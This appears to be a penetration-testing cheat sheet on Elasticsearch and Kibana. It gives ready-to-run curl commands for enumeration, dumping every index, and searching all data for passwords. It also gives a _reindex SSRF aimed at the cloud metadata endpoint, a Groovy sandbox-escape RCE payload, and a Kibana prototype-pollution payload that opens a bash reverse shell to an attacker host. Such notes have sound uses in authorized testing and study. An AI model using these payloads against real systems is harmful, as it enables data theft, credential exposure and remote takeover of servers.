# Elasticsearch

#Elasticsearch #database #search #ELK #nosql

## What is Elasticsearch?
Distributed RESTful search and analytics engine. Part of the ELK stack (Elasticsearch, Logstash, Kibana). Stores data as JSON documents in indices, fully accessible via HTTP REST API.

- Port: **TCP 9200** — HTTP REST API
- Port: **TCP 9300** — cluster transport (node-to-node)
- Port: **TCP 5601** — Kibana UI (if deployed)
- Config: `/etc/elasticsearch/elasticsearch.yml`
- Data dir: `/var/lib/elasticsearch/`

> [!important] **"No auth by default" is now version-dependent.** Since **Elasticsearch 8.0 (2022)** the security features (`xpack.security.enabled`) are **on by default** — a fresh 8.x cluster generates a password for the `elastic` user and requires TLS. The classic unauthenticated `curl :9200/_cat/indices` dump lands on **pre-8.0 clusters, the free/OSS Basic tier with security left off, or anything an admin explicitly opened up**. On a modern target, an open 9200 is a *misconfiguration* finding, not the default — confirm the version (`curl :9200`) before assuming anonymous access.

---

## Tools

| Tool | Use |
|---|---|
| [[Tools/File Transfer/cURL\|cURL]] | All REST API interaction — enumeration, data dump, scripted RCE, `_reindex` SSRF |
| [[Tools/Scanning/NMAP\|Nmap]] | Identify Elasticsearch (9200/9300) + version banner |
| [[Tools/Payloads & Shells/metasploit\|Metasploit]] | `search_groovy_script`/`script_mvel_rce` (ES RCE) and `kibana_timelion_prototype_pollution` |

---

## Enumeration

```bash
# Nmap
nmap -p 9200,9300 --script http-title,banner -sV <target>

# Check cluster info (no auth)
curl -s http://<target>:9200/
curl -s http://<target>:9200/_cluster/health | python3 -m json.tool

# Version check
curl -s http://<target>:9200 | python3 -m json.tool
```

---

## Connect / Access

```bash
# All access via HTTP REST API
curl -s http://<target>:9200/<endpoint>

# With basic auth (if x-pack security enabled)
curl -u <user>:<pass> http://<target>:9200/
curl -u elastic:<pass> http://<target>:9200/

# Kibana (if available) — access in browser
http://<target>:5601
```

---

## Key API Endpoints

```bash
# Cluster & node info
curl -s http://<target>:9200/
curl -s http://<target>:9200/_cluster/health
curl -s http://<target>:9200/_cluster/state
curl -s http://<target>:9200/_nodes

# List all indices
curl -s http://<target>:9200/_cat/indices?v
curl -s http://<target>:9200/_cat/indices?v&s=index

# Index details / mapping
curl -s http://<target>:9200/<index>
curl -s http://<target>:9200/<index>/_mapping

# Search all documents in index
curl -s http://<target>:9200/<index>/_search?pretty
curl -s http://<target>:9200/<index>/_search?q=*&pretty&size=1000

# Get specific document by ID
curl -s http://<target>:9200/<index>/_doc/<id>

# Search with query body
curl -s -X GET http://<target>:9200/<index>/_search \
  -H 'Content-Type: application/json' \
  -d '{"query": {"match_all": {}}, "size": 100}'

# Search for specific field value
curl -s -X GET http://<target>:9200/<index>/_search \
  -H 'Content-Type: application/json' \
  -d '{"query": {"match": {"username": "admin"}}}'

# Dump all indices + documents
curl -s http://<target>:9200/_cat/indices?v | awk '{print $3}' | grep -v index | while read idx; do
  echo "=== $idx ==="
  curl -s "http://<target>:9200/$idx/_search?size=100&pretty"
done

# List users (if x-pack)
curl -s http://<target>:9200/_security/user
curl -u elastic:<pass> http://<target>:9200/_security/user
```

---

## Attack Vectors

### Unauthenticated Data Dump

```bash
# Get all indices
curl -s http://<target>:9200/_cat/indices?v

# Dump all docs from interesting index
curl -s "http://<target>:9200/<index>/_search?size=10000&pretty" | python3 -m json.tool

# Search for credentials across all indices
curl -s -X POST http://<target>:9200/_search \
  -H 'Content-Type: application/json' \
  -d '{"query": {"multi_match": {"query": "password", "fields": ["*"]}}}'
```

### `_reindex` SSRF (Remote Reindex)

Elasticsearch's `_reindex` API can pull documents **from a remote cluster** specified in the request body. If the target lets you call it, the ES server will make an attacker-controlled outbound HTTP request — an SSRF primitive that reaches internal services and cloud metadata from the ES host's network position. The remote host must be in `reindex.remote.whitelist`, but that's frequently left wide (`*:*`) or unset-then-permissive on internal clusters.

```bash
# Point _reindex at an internal/metadata URL — the ES server fetches it
curl -s -X POST "http://<target>:9200/_reindex" -H 'Content-Type: application/json' -d '{
  "source":{"remote":{"host":"http://169.254.169.254:80"},"index":"whatever"},
  "dest":{"index":"ssrf-test"}}'
# The fetch result / error is reflected back in the response — read it for the SSRF'd content.
```

### RCE via Groovy / MVEL Sandbox Escape (CVE-2014-3120, CVE-2015-1427)

Affects Elasticsearch **< 1.6.0** with dynamic scripting enabled — long patched, but still seen on abandoned legacy clusters.

> [!note] **Modern scripting is Painless, not Groovy.** Groovy/MVEL dynamic scripting was removed in ES 5.0 (2016) and replaced by **Painless**, a purpose-built sandboxed language. The CVE-2014/2015 payloads below only work on ancient versions. Painless has had its own sandbox-escape research over the years, but there is no reliable unauthenticated Painless RCE on current versions — don't expect the Groovy trick to work on anything modern.

```bash
# CVE-2015-1427 — Groovy sandbox escape
curl -X POST "http://<target>:9200/_search" -H 'Content-Type: application/json' -d '{
  "size": 1,
  "query": {"match_all": {}},
  "script_fields": {
    "result": {
      "lang": "groovy",
      "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next()"
    }
  }
}'

# Metasploit
use exploit/multi/elasticsearch/script_mvel_rce
use exploit/multi/elasticsearch/search_groovy_script
```

### Kibana RCE (CVE-2019-7609)

```bash
# Kibana < 6.6.1 — timelion script injection
# In Kibana timelion:
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i >& /dev/tcp/<attacker>/<port> 0>&1\'')")

# Metasploit
use exploit/multi/http/kibana_timelion_prototype_pollution
```

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| `xpack.security.enabled: false` (or pre-8.0 default) | Unauthenticated full read/write over 9200 |
| `network.host: 0.0.0.0` | Exposed to network |
| Dynamic scripting enabled (legacy) | RCE via Groovy/MVEL on <1.6 |
| `reindex.remote.whitelist: *:*` (or over-broad) | `_reindex` SSRF to internal services / cloud metadata |
| Old version (< 5.x) | No built-in security features |
| Kibana exposed without auth | Indirect data access and potential RCE |

---

## Quick Reference

| Goal | Command |
|---|---|
| Version check | `curl -s http://host:9200/` |
| List indices | `curl -s http://host:9200/_cat/indices?v` |
| Dump index | `curl -s "http://host:9200/index/_search?size=1000&pretty"` |
| Search all | `curl -s http://host:9200/_search?pretty` |
| Cluster health | `curl -s http://host:9200/_cluster/health` |
| List users (x-pack) | `curl -u elastic:pass http://host:9200/_security/user` |
| `_reindex` SSRF | `curl -sX POST http://host:9200/_reindex -H 'Content-Type: application/json' -d '{"source":{"remote":{"host":"http://169.254.169.254:80"},"index":"x"},"dest":{"index":"y"}}'` |
| Nmap | `nmap -p 9200,9300 -sV host` |

---

> [!note] **See also** — MongoDB / Redis / other unauthenticated NoSQL data stores follow the same "open port → full dump" pattern: [[Services/Database Services/MongoDB|MongoDB]], [[Services/Database Services/Redis|Redis]].

---

*Created: 2026-07-13*
*Updated: 2026-09-22*
*Model: claude-opus-4-8*
